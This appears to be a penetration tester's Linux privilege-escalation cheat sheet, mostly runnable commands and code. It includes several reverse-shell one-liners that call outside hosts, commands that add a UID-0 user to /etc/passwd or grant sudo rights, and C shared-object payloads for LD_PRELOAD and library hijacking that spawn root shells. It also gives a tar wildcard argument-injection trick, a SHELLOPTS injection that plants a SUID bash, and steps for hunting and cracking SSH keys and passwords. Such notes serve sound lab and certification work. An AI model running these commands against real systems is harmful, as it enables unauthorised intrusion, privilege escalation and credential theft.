# Methodology
- [ ] `sudo -l` (if you have password or are in /etc/sudoers)
- [ ] `tree` /home folders
- [ ] Check `/opt` folder
- [ ] If `adm` group, check `/var/logs` auth.log, syslog, messages
- [ ] /etc/passwd, /etc/shadow, /etc/sudoers (`ls -l` and cat)
- [ ] Enumerate for SSH keys (id_rsa, id_ed25519, id_ecdsa)
	- [ ] `find / -type f \( -iname "id_rsa" -o -iname "id_ecdsa" \) 2>/dev/null`
- [ ] Enumerate or sensitive files
	- [ ] XML configs: `find /home -type f -iname "*.xml" 2>/dev/null`
	- [ ] KeePass: `find / -type f -iname "*.kdbx" 2>/dev/null`
- [ ] Enumerate WWW, Spool, FTP
	- [ ] Check for databases in `/www/`
- [ ] Enumerate cronjobs
	- [ ] `crontab -l`, and `cat /etc/crontab`
- [ ] Enumerate binaries
- [ ] Enumerate groups, ids
- [ ] Enumerate running processes (pspy)
- [ ] Enumerate SIDs
- [ ] Enumerate netstat and local services
	- [ ] In addition to those only on localhost, make sure to crosscheck ports against those that showed up in nmap scan in case of firewall block
- [ ] Enumerate kernel version (`uname -a`, `cat /etc/os-release`, `cat /prov/version`)

# Generating hash for /etc/passwd
`openssl passwd w00t` (best to always run this on victim machine AND on every revert)
Copy the entire thing: `$1$cebTYFNH$8rlW60.TMWsiecw6UqxoR1`
`echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash"`
Then, `su root2`
> The output of the OpenSSL `passwd` command may vary depending on the system executing it. On older systems, it may default to the DES algorithm, while on some newer systems it could output the password in MD5 format.

`/etc/passwd` column legend: 
`username:password:UID:GID:comment:home_directory:shell`
# Print Flags
```bash
ifconfig && hostname && whoami && cat local.txt
```
```bash
ifconfig && hostname && whoami && cat proof.txt
```

# Basic Commands
Reverse Shells:
```bash
busybox nc 10.10.10.10 1234 -e sh
bash -c 'bash -i >& /dev/tcp/192.168.86.99/443 0>&1'
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
# Pentest Monkey special
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

# Add user
adduser NameOfUser
# Add user to group
adduser NameOfUser sudo
# Workaround for editing sudoers file without interactive shell
echo "username ALL=(ALL) ALL" >> /etc/sudoers
# Check which users are in the sudo group
cat /etc/group | grep sudo
# Add a path to $PATH
export PATH=/new/path:$PATH
```

# Basic Enumeration
```bash
# Shell history
history
cat ~/.bash_history

# User context
whoami
id
groups
# Check logged-in users
w
who
last

# Groups
/etc/group
groups <username>
getent group <groupname> # View members of group

# Check for interesting capabilities
sudo -l
getcap -r / 2>/dev/null

# Networking
ip a
route -n
cat /etc/network/interfaces
iptables -L
ufw status verbose

# Check logs
cat /var/log/auth.log
cat /var/log/syslog
cat /var/log/messages

# Sensitive files
ls -la /etc/*.conf
cat /etc/apache2/apache2.conf
cat /etc/nginx/nginx.conf

# Check for world-writable sensitive files
find /etc -writable 2>/dev/null
find /var -writable 2>/dev/null

cat ~/.bashrc
ls -al ~
ls -al ~/.ssh
# Enumerate OS and Kernel version
uname -a
cat /etc/*-release
cat /proc/version
hostnamectl

# Search for passwords or SSH keys in home directories
grep -Ri "password" /home/* 2>/dev/null
find /home -name "id_rsa" 2>/dev/null
find /home -name "*.pem" 2>/dev/null

# Check mounts (especially NFS)
mount
cat /etc/fstab

# Enumerate installed software
dpkg -l  # Debian-based
rpm -qa  # RedHat-based
snap list
```

# Tiberius

### Linux Smart Enumeration
`lse.sh`
`lse.sh -i` to not prompt for password
`lse.sh -l 1 -i` to verbose and not prompt for password
`lse.sh -l 2 -i` to fully verbose and not prompt for password
### LinEnum
```bash
# `-k` marks the argument given as an interesting word and collects any files containing it in the `-e` export directory. `-t` enumerates Thoroughly.
./LinEnum.sh -k password -e export -t
```
Other tools include
- linuxprivchecker
- BeRoot
- unix-privesc-check

## Users
- Try `su <USER>` using their username as their password

# Basics

### 1) PATH Environment Variable
Find all SUID and SGID binaries. Run `strings` on those programs to find relative paths; hijack any relative paths if possible.

### 2) Sudo
List programs a user is allowed (and disallowed) to run
`sudo -l`
GTFObins these programs
- If `apache2` is one of these programs, it can be manipulated to print the first line of any given file via error message: `sudo apache2 -f /etc/shadow` (will print first line which is `root`'s hash)

If your low privileged user account can use sudo unrestricted (i.e., you can run any programs) and you know the user's password:
`sudo su`

Open new shell session with root privileges, but maintain current user environment
`sudo -s` 
Hijack:
```bash
echo $PATH
export PATH=/tmp:$PATH
echo "/bin/bash" > /tmp/sudo
chmod +x /tmp/sudo
sudo sudo -s
```

Open login shell as root, simulating root login
`sudo -i`
```bash
echo "/bin/bash -p" >> /root/.bashrc
sudo -i  # Will drop you into a root shell due to the modified script
```

Environment variables: programs run with through `sudo` can inherit the environment variables from the user's environment. In the `/etc/sudoers` config file, if the `env_reset` option is set, `sudo` will run programs in a new, minimal environment. The `env_keep` option can be sued to keep certain environment variables from the user's environment. The configured options are displayed when running `sudo -l`

### 3) Cron Jobs / Cron Tabs
Look for jobs running super frequently.
- List cronjobs
	- `crontab -l`
- User crontabs are usually located in `/var/spool/cron/` or `/var/spool/cron/crontabs/`
- System-wide crontab is located at `/etc/crontab`
	- Also
		- `/etc/cron.daily`
		- `/etc/cron.hourly`
		- `/etc/cron.weekly`
		- `/etc/cron.monthly`

Crontab PATH variable is by default set to `/usr/bin:/bin`. The PATH variable can be overwritten in the crontab file. If a cronjob program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to hijack

### 4) Search for SUID Binaries
- GTFObins
- `find / -perm -u=s -type f 2>/dev/null`
- Another technique from [[Vulnversity (Create Malicious Service)]]
> 	- 1) Used `find / -user root -perm -4000 -exec ls -ldb {} \;` to identify that `/bin/systemctl` is set with SUID bit

- Find SUID AND **SGID**:
	- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

Search for `.txt` files
`find / -name *.txt`

### 5) Interesting Files
- Check for interesting files in (make sure to enumerate hidden files `ls -a`):
	- `/`
	- `/tmp`
	- `/var/backups`
- Check for SSH keys in all users' home directories
	- Check root login is permitted: `grep -i PermitRootLogin /etc/ssh/sshd_config`
	- `chmod 600 root_key` on the stolen key
- Check `/etc/shadow`
	- Is writable? Insert known hash `mkpasswd -m sha-512 newpassword` and `su` to that user
	- Is readable? Crack passwords
- Check `/etc/passwd` is writable (we can insert a known hash and `su` to that user)
	- `openssl passwd "password"`
	- If we can only append to the file, we can create a new user but assign the m the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different
- Check LSE's "Writable files outside user's home" section
- `/dev/shm` and `/tmp` are places we can read and write to on all users

### 6) Passwords & Keys
Check for service configuration files and SSH keys.
#### Cracking SSH Keys
SSH Private Keys may have an associated passphrase. Prepare the key for the crackening:
```bash
ssh2john id_rsa > ssh.hash
```

John to crack hash (because Hashcat does not yet support `aes-256-ctr` cipher which modern private keys and their corresponding passphrases are created with)
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash
```
*Note: sshRules is something I made for lab. Either remove or use actual good rules. Rules can be found in /etc/john/john.conf*

### 7) Search for every directory writable by current user
- Check LSE's "Writable files outside user's home" section
Manually:
`find / -writable -type d 2>/dev/null`
### 8) Check mounts
- `cat /etc/fstab`
- `mount`
- `lsblk`
- `lsmod
- `/sbin/modinfo libata`

### 9) Linux Capabilities
# Linux Capabilities
Search for them:
```bash
/usr/sbin/getcap -r / 2>/dev/null
```
1. **`cap_setuid`** / **`cap_setgid`** – Allows a process to change its user or group ID, potentially enabling privilege escalation.
2. **`cap_net_bind_service`** – Lets a process bind to low-numbered ports (<1024) without root, which can be abused in network service misconfigurations.
3. **`cap_net_raw`** – Grants access to raw sockets, allowing packet sniffing or crafting, which can expose sensitive network traffic.
4. **`cap_dac_read_search`** – Bypasses file and directory read/search restrictions, potentially allowing access to sensitive files like /etc/shadow.
5. **`cap_dac_override`** – Ignores file permission checks, enabling unrestricted file access, modification, and potential system compromise.
6. **`cap_sys_admin`** – Provides extensive system control, including mounting filesystems, modifying kernel parameters, and executing privileged operations.
7. **`cap_fowner`** – Allows changing file ownership, which can be exploited to take control of critical system files.

# Advanced: Service Exploits
***Run pspy***
### 10) Service Exploits
Automatically: Linux Smart Enumeration or linPEAS
`echo -e "$(cat /path/to/file/here.txt)"` linpeas file output if not rendering color properly

Manually:
Enumerate services running as root
`ps aux | grep "^root"`
Enumerating program versions
`<program> -v`
`<program> --version`
`dpkg -l | grep <program>`
`rpm -qa | grep <program>`

### 11) Check Services Listening on Ports
**NOTE: also look for those that have been firewalled (e.g., crosscheck what showed up on nmap vs `netstat -tulpn`)**

Look for processes/services running that are bound to other network interfaces (or especially localhost 127.0.0.1) that can be pivoted to via port forwarding

`netstat -tulpn`
- `-t` show TCP
- `-u` show UDP
- `-l` show only listening sockets
- `-p` show PID
- `-n` show numerical address

### 12) Port Forwarding
In some instances, a root process may be bound to an internal port, through which it communicates. If, for some reason, an exploit cannot run locally on the target machine, the port can be forwarded using SSH to your local machine:
`ssh -R <local-port>:<127.0.0.1>:<service-port> <username>@<local-machine>`

### 13) Shared Object Hijacking
Run `strace` on a program to see whether shared objects are being loaded.
```bash
strace <program> 2>&1 | grep -iE "open|access|no such file"
```
`.so` file payload:
```C
# Compile with gcc -shared -fPIC -o shared.so shared.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```

### 14) LD_PRELOAD
Environment variable which can be set to the path of a shared object `.so` file. When set, the shared object will be loaded before any others. By creating a custom shared object and creating an `init()` function, we can execute code as soon as the object is loaded. Limitations:
1) LD_PRELOAD will not work if the real user ID is different from the effective user ID
2) sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option
	1) `sudo -l` in its output will show `env_keep+=LD_PRELOAD` if this is true

Attack: check above that LD_PRELOAD is allowed as env_keep in `sudo -l`, then:
```C
# Compile with 'gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
Run against a program with `sudo LD_PRELOAD=/tmp/preload.so find`
We should now have a root shell. *NOTE: as a security measure, this will not work against SUID files. Only files that we can run `sudo` directly on.*

### 15) LD_LIBRARY_PATH (does not work against SUID)
The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first. The `ldd` command can be used to print the shared libraries used by a program:
`ldd /usr/sbin/apache2`
By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.
Attack:
Run `ldd` against SUID-able program:
`ldd /usr/sbin/apache2`
- Note: hijacking shared objects using this method is hit or miss. Choose one from the list and try it (`libcrypt.so.1` seems to work well)
```C
# Compile with 'gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c'
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
Finally, execute the program:
`sudo LD_LIBRARY_PATH=/tmp apache2`
***NOTE: as a security measure, this will not work against SUID files. Only files that we can run `sudo` directly on.***

# Advanced: Misc

### 16) Wildcarding/Globbing
If there is wildcarding/globbing in a cronjob, some filesystems are very permissive and will allow you to name a file something like `--launch-reverse-shell` (as a crude example). The name of the file will then be interpreted as an argument to the command by whatever program is wildcarding/globbing. E.g.,
`some-script.sh --l*` will expand out to `some-script.sh --list-reverse-shell`

To create such file names: 
```bash
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh /opt/admin/privesc.sh'
```
Then create a reverse shell `privesc.sh` that is to be executed:
```bash
bash -i >& /dev/tcp/192.168.45.201/53 0>&1
```

### 17) Abusing Shell Features (#1: Functions)
Prerequisite: Bash version `<4.2-048`
Functions can be defined in the shell and they will take precedence over the actual executable being called.

Find SUID/SGID files that call some program using an absolute file path
```bash
# Example: we found SUID/SGID file that calls a program at absolute file "usr/bin/service" 
function /usr/bin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

### 18) Abusing Shell Features (#2: SHELLOPTS)
Prerequisite: Bash version `<4.4`

This will open a debug channel and run the command given to `PS4` on each message prompt.
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown
root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
```

### 19) NFS
Show the NFS server's export list:
`showmount -e <target>`
Mount an NFS share:
`mount -o rw,vers=2 <target>:<share> <local_directory>`

Root Squashing
**Although prevented by default, `no_root_squash` is an NFS configuration option which turns root squashing off. When included in a writable share configuration, a remote user who identifies as "root" can create files on the NFS share as the local root user.**

Upload an SUID-able ELF with MSFVenom to the NFS share and execute.

### 20) Finding Kernel Exploits
Common Ubuntu 16.04:
https://www.exploit-db.com/exploits/44298

Automatically:
`linux-exploit-suggester-2`
`./linux-exploit-suggester-2.pl -k 2.6.32`

Manually:
1) Enumerate kernel version
	1) `uname -a`
	2) `cat /etc/*-release`
	3) `cat /proc/version`
	4) `hostnamectl`
2) Find matching exploits (Google, ExploitDB, GitHub)
	1) `searchsploit linux kernel 2.6.32 priv esc`
	2) `searchsploit linux kernel 2.6 debian priv esc`
	3) `searchsploit "4.4.0 linux kernel privilege escalation"`
3) Compile and run (caution, some may cause instability)
### ^M bad interpreter (Windows Compiled)
If error is something like `^M bad interpreter`, this was compiled on Windows. Run `dos2unix <script>` to fix.

Dirty COW affects Linux kernel <4.8.3.

# OpenBSD
- `locate` is available
- `doas` is an alternative to `sudo`
	- See config file `doas.conf` in either `/etc` or `/usr/local/etc`

Example `doas.conf`
```
permit nopass andrew as root cmd service args apache24 onestart
```
This indicates the cmd that can be run as root is `service` with the args `apache24 onestart`; such as: `doas -u root service apache24 onestart`
### OpenBSD Reverse Shell
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.196 53 >/tmp/f
```
